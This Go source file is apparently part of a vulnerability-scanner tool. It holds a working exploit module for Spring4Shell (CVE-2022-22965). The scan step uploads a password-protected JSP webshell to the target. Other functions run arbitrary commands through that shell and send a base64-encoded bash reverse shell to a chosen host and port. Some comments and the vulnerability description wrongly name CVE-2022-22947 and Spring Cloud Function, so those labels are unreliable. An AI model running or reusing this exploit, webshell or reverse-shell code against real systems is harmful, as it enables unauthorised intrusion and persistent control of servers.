package vulns

import (
	"context"
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"
	cli "vuln-scanner/client"
	"vuln-scanner/common"
	"vuln-scanner/logger"
	"vuln-scanner/utils"
)

var (
	ExploitURL = ""
)

// CVE202222947Scanner CVE-2022-22947漏洞扫描器
// 实现Spring Cloud Gateway SpEL远程代码执行漏洞扫描
type CVE202222965Scanner struct {
	statistics ScanStatistics // 扫描统计信息
	startTime  time.Time      // 扫描开始时间
}

// NewCVE202222947Scanner 创建CVE-2022-22947漏洞扫描器
func NewCVE202222965Scanner() *CVE202222965Scanner {
	return &CVE202222965Scanner{}
}

// GetScannerName 获取扫描器名称
func (s *CVE202222965Scanner) GetScannerName() string {
	return "cve_2022_22965_scanner"
}

// GetSupportedVulnerabilities 获取扫描器支持的漏洞类型
func (s *CVE202222965Scanner) GetSupportedVulnerabilities() []string {
	return []string{
		"CVE-2022-22965",
	}
}

// GetScanStatistics 获取扫描统计信息
func (s *CVE202222965Scanner) GetScanStatistics() ScanStatistics {
	// 确保更新扫描持续时间
	if s.statistics.ScanDuration == 0 && !s.startTime.IsZero() {
		s.statistics.ScanDuration = time.Since(s.startTime)
	}
	return s.statistics
}

// ExecuteCommand 执行命令
func (s *CVE202222965Scanner) ExecuteCommand(target string, command string, options ScanOptions) (string, error) {
	if ExploitURL == "" {
		return "", fmt.Errorf("CVE-2022-22965 WebShell未生成")
	}

	// 解析ExploitURL，提取基础URL和参数
	shellURL, err := url.Parse(ExploitURL)
	if err != nil {
		return "", fmt.Errorf("解析WebShell URL失败: %w", err)
	}

	// 提取现有参数
	params := shellURL.Query()

	// 更新cmd参数为新命令
	params.Set("cmd", command)

	// 重新设置查询参数
	shellURL.RawQuery = params.Encode()

	// 创建HTTP客户端
	clientConfig := cli.HTTPClientConfig{
		Timeout:       time.Duration(options.Timeout) * time.Second,
		Proxy:         options.Proxy,
		SkipSSL:       options.SkipSSL,
		AllowRedirect: options.AllowRedirect,
	}

	client, err := cli.NewHTTPClient(clientConfig)
	if err != nil {
		return "", fmt.Errorf("创建HTTP客户端失败: %w", err)
	}

	// 发送请求执行命令
	req, err := http.NewRequest(http.MethodGet, shellURL.String(), nil)
	if err != nil {
		return "", fmt.Errorf("创建HTTP请求失败: %w", err)
	}

	// 设置请求头
	req.Header.Set("User-Agent", "Mozilla/5.0 (Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0")
	req.Header.Set("Accept", "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2")
	req.Header.Set("Connection", "close")
	req.Header.Set("DNT", "1")

	// 执行请求
	resp, err := client.GetHTTPClient().Do(req)
	if err != nil {
		return "", fmt.Errorf("发送HTTP请求失败: %w", err)
	}
	defer resp.Body.Close()

	// 读取响应
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf("读取响应体失败: %w", err)
	}

	// 检查响应状态码
	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("HTTP状态码错误，期望200 OK，实际 %d", resp.StatusCode)
	}

	return string(body), nil
}

// StartReverseShell 启动反弹shell
func (s *CVE202222965Scanner) StartReverseShell(target string, host string, port string, options ScanOptions) (string, error) {
	if ExploitURL == "" {
		return "", fmt.Errorf("CVE-2022-22965 WebShell未生成")
	}

	// 解析ExploitURL，提取基础URL和参数
	shellURL, err := url.Parse(ExploitURL)
	if err != nil {
		return "", fmt.Errorf("解析WebShell URL失败: %w", err)
	}

	// 提取现有参数
	params := shellURL.Query()

	reverseShell := fmt.Sprintf("bash -i >&/dev/tcp/%s/%s 0>&1", host, port)
	encodedCmd := base64.StdEncoding.EncodeToString([]byte(reverseShell))
	revcmd := fmt.Sprintf("bash -c {echo,%s}|{base64,-d}|{bash,-i}", encodedCmd)
	// 对revcmd进行URL编码
	urlEncodedRevcmd := url.QueryEscape(revcmd)
	params.Set("cmd", urlEncodedRevcmd)
	shellURL.RawQuery = params.Encode()

	client, err := cli.CreateHTTPClient(options.Proxy, options.SkipSSL, options.AllowRedirect, time.Duration(options.Timeout)*time.Second)
	if err != nil {
		return "", fmt.Errorf("创建HTTP客户端失败: %w", err)
	}

	// 发送请求执行反弹shell
	req, err := http.NewRequest(http.MethodGet, shellURL.String(), nil)
	if err != nil {
		return "", fmt.Errorf("创建HTTP请求失败: %w", err)
	}
	go func() {
		_, _ = client.Do(req)
	}()

	return fmt.Sprintf("Shell反弹请求已发送,请检查你的Netcat监听结果。\n监听地址: %s:%s\n\n提示：\n1. 反弹shell命令已启动\n2. 如果连接成功，你应该能在netcat中看到shell提示符\n3. 请确保你的监听端口是开放的\n", host, port), nil
}

// GetMemoryShellTypes 获取支持的内存马类型
func (s *CVE202222965Scanner) GetMemoryShellTypes() ([]map[string]string, error) {
	return []map[string]string{}, nil
}

// InjectMemoryShell 注入内存马
func (s *CVE202222965Scanner) InjectMemoryShell(target string, password string, path string, shellType string, options ScanOptions) (string, error) {
	return "", fmt.Errorf("CVE-2022-22965不支持注入内存马")
}

// GetSupportedFeatures 获取支持的功能
func (s *CVE202222965Scanner) GetSupportedFeatures() []string {
	return []string{"command", "shell"} // 不支持任何功能
}

func (s *CVE202222965Scanner) Scan(ctx context.Context, target string, options ScanOptions) ([]common.Vulnerability, error) {
	var vulnerabilities []common.Vulnerability

	// 初始化统计信息
	s.statistics = ScanStatistics{}
	s.startTime = time.Now()

	// 获取或者创建logger
	log := options.Logger
	if log == nil {
		log = logger.NewDefaultLogger()
	}

	// 创建日志上下文
	baseCtx := logger.LogContext{
		Target:      target,
		ScannerName: s.GetScannerName(),
		Timestamp:   time.Now(),
	}

	// 检查上下文是否已取消
	select {
	case <-ctx.Done():
		err := &ScanError{
			Type:    ErrorTypeTimeout,
			Message: "扫描上下文已取消",
			Target:  target,
			Err:     ctx.Err(),
		}
		log.Error("扫描被取消", err, baseCtx)
		return nil, err
	default:
	}

	// 设置请求头
	headers := map[string]string{
		"User-Agent":   "Go-http-client/1.1",
		"Connection":   "close",
		"suffix":       "%><!--//",
		"c1":           "Runtime",
		"c2":           "<%",
		"DNT":          "1",
		"Content-Type": "application/x-www-form-urlencoded",
	}

	password := "pass"
	directory := "ROOT"
	filename := utils.RandomString(8)

	// 构建请求数据
	data := fmt.Sprintf(
		"class.module.classLoader.resources.context.parent.pipeline.first.pattern=%%25%%7Bc2%%7Di%%20if(%%22%s%%22.equals(request.getParameter(%%22pwd%%22)))%%7B%%20java.io.InputStream%%20in%%20%%3D%%20%%25%%7Bc1%%7Di.getRuntime().exec(request.getParameter(%%22cmd%%22)).getInputStream()%%3B%%20int%%20a%%20%%3D%%20-1%%3B%%20byte%%5B%%5D%%20b%%20%%3D%%20new%%20byte%%5B2048%%5D%%3B%%20while((a%%3Din.read(b))!%%3D-1)%%7B%%20out.println(new%%20String(b))%%3B%%20%%7D%%20%%7D%%20%%25%%7Bsuffix%%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/%s&class.module.classLoader.resources.context.parent.pipeline.first.prefix=%s&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=",
		password, directory, filename,
	)
	log.LogScanStep("构造Payload:", map[string]interface{}{
		"payload": data,
	}, baseCtx)

	// 创建自定义 HTTP 客户端（跳过 TLS 验证）
	client, err := cli.CreateHTTPClient(options.Proxy, options.SkipSSL, options.AllowRedirect, time.Duration(options.Timeout)*time.Second)
	if err != nil {
		return nil, fmt.Errorf("创建HTTP客户端失败: %w", err)
	}
	log.LogScanStep("客户端创建成功", map[string]interface{}{
		"Proxy":   options.Proxy,
		"SkipSSL": options.SkipSSL,
		"Timeout": options.Timeout,
	}, baseCtx)
	targetURL := strings.TrimSuffix(target, "/")
	log.LogScanStep("请求URL", map[string]interface{}{"URL": targetURL}, baseCtx)
	// 发送 POST 请求
	req, err := http.NewRequest("POST", targetURL, strings.NewReader(data))
	if err != nil {
		return nil, fmt.Errorf("创建请求失败: %v", err)
	}

	// 设置请求头
	for key, value := range headers {
		req.Header.Set(key, value)
	}
	log.LogScanStep("上传webshell", map[string]interface{}{
		"URL":     targetURL,
		"method":  "POST",
		"headers": utils.HeaderMap(req.Header),
		"body":    data,
	}, baseCtx)
	log.LogRequest("POST", targetURL, utils.HeaderMap(req.Header), []byte(data), baseCtx)

	start := time.Now()
	resp, err := client.Do(req)
	duration := time.Since(start)
	if err != nil {
		return nil, fmt.Errorf("请求失败: %v", err)
	}
	defer resp.Body.Close()

	// 读取响应体（可选）
	body, _ := io.ReadAll(resp.Body)
	_ = body
	log.LogResponse(resp.StatusCode, utils.HeaderMap(resp.Header), body, duration, baseCtx)

	// 检查 shell 是否上传成功
	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		return nil, fmt.Errorf("URL 解析失败: %v", err)
	}

	// 构建 shell URL
	shellURL := fmt.Sprintf("%s://%s/%s.jsp",
		parsedURL.Scheme,
		parsedURL.Host,
		filename,
	)
	log.LogScanStep("测试上传的webshell", map[string]interface{}{"URL": shellURL}, baseCtx)

	// 定义最大尝试次数和重试间隔
	maxRetries := 3
	retryInterval := 2 * time.Second

	// 创建通道用于接收检查结果
	resultChan := make(chan struct {
		code int
		err  error
		body []byte
	})

	// 启动goroutine进行多次检查
	go func() {
		for i := 0; i < maxRetries; i++ {
			// 第一次尝试前等待2秒，后续尝试前等待重试间隔
			if i > 0 {
				time.Sleep(retryInterval)
			} else {
				time.Sleep(2 * time.Second)
			}

			log.LogScanStep(fmt.Sprintf("尝试访问shell (尝试 %d/%d)", i+1, maxRetries), map[string]interface{}{"URL": shellURL, "method": "GET"}, baseCtx)
			shellReq, err := http.NewRequest("GET", shellURL, nil)
			if err != nil {
				if i == maxRetries-1 {
					resultChan <- struct {
						code int
						err  error
						body []byte
					}{0, err, nil}
					return
				}
				continue
			}
			shellReq.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36")
			log.LogRequest("GET", shellURL, utils.HeaderMap(shellReq.Header), nil, baseCtx)
			start := time.Now()
			shellResp, err := client.Do(shellReq)
			duration := time.Since(start)
			if err != nil {
				if i == maxRetries-1 {
					resultChan <- struct {
						code int
						err  error
						body []byte
					}{0, err, nil}
					return
				}
				continue
			}

			shellBody, _ := io.ReadAll(shellResp.Body)
			shellResp.Body.Close()
			log.LogResponse(shellResp.StatusCode, utils.HeaderMap(shellResp.Header), shellBody, duration, baseCtx)

			// 如果成功，立即发送结果并退出
			if shellResp.StatusCode == http.StatusOK {
				resultChan <- struct {
					code int
					err  error
					body []byte
				}{shellResp.StatusCode, nil, shellBody}
				return
			}

			// 如果是最后一次尝试，发送最终结果
			if i == maxRetries-1 {
				resultChan <- struct {
					code int
					err  error
					body []byte
				}{shellResp.StatusCode, nil, shellBody}
				return
			}
		}
	}()

	// 等待检查结果
	result := <-resultChan
	if result.err != nil {
		return nil, fmt.Errorf("检查 shell URL 失败: %v", result.err)
	}

	if result.code == http.StatusOK {
		// 构建完整的shell URL，包含密码和命令参数
		fullShellURL := fmt.Sprintf("%s?pwd=%s&cmd=whoami", shellURL, password)
		// 更新全局变量
		ExploitURL = fullShellURL

		log.Info("✓ Shell上传成功", baseCtx)
		log.Info(fmt.Sprintf("Shell 地址: %s\n", fullShellURL), baseCtx)
		vulnerabilitie := common.Vulnerability{
			ID:                len(vulnerabilities) + 1,
			VulnerabilityType: "CVE-2022-22965",
			Severity:          "严重",
			Target:            target,
			URL:               fullShellURL,
			Payload:           data,
			Description:       "Spring Cloud Function存在SpEL表达式注入漏洞。攻击者可以通过spring.cloud.function.routing-expression请求头注入恶意SpEL表达式，导致远程代码执行(RCE)。",
			Proof:             fmt.Sprintf("上传webshell成功，shell地址: %s\n", fullShellURL),
			Recommendation:    "1. 升级Spring Cloud Function至安全版本（3.1.7+或3.2.3+）\n2. 将StandardEvaluationContext替换为SimpleEvaluationContext\n3. 在application.properties中设置spring.cloud.function.spel.enabled=false\n4. 配置Web应用防火墙过滤恶意请求头",
			ResponseHeaders:   utils.HeaderMap(resp.Header),
			ResponseContent:   string(body),
			Timestamp:         time.Now(),
		}
		vulnerabilities = append(vulnerabilities, vulnerabilitie)
		log.LogVulnerabilityFound(vulnerabilitie, baseCtx)
		return vulnerabilities, nil
	}

	// 更新统计信息
	s.statistics.ScanDuration = time.Since(s.startTime)
	s.statistics.VulnerabilitiesFound = len(vulnerabilities)
	s.statistics.TotalRequests = 1

	log.Info(fmt.Sprintf("扫描统计[扫描耗时: %v, 发现漏洞数: %d, 总请求数: %d]",
		s.statistics.ScanDuration, s.statistics.VulnerabilitiesFound, s.statistics.TotalRequests), baseCtx)

	return nil, fmt.Errorf("漏洞利用失败，响应状态码: %d", result.code)
}

// // headers := map[string]string{
// // 		"User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0",
// // 		"Accept-Encoding": "gzip, deflate",
// // 		"Accept":          "*/*",
// // 		"Connection":      "close",
// // 		"suffix":          "%>",
// // 		"c1":              "Runtime",
// // 		"c2":              "<%",
// // 		"DNT":             "1",
// // 		"Content-Type":    "application/x-www-form-urlencoded",
// // }
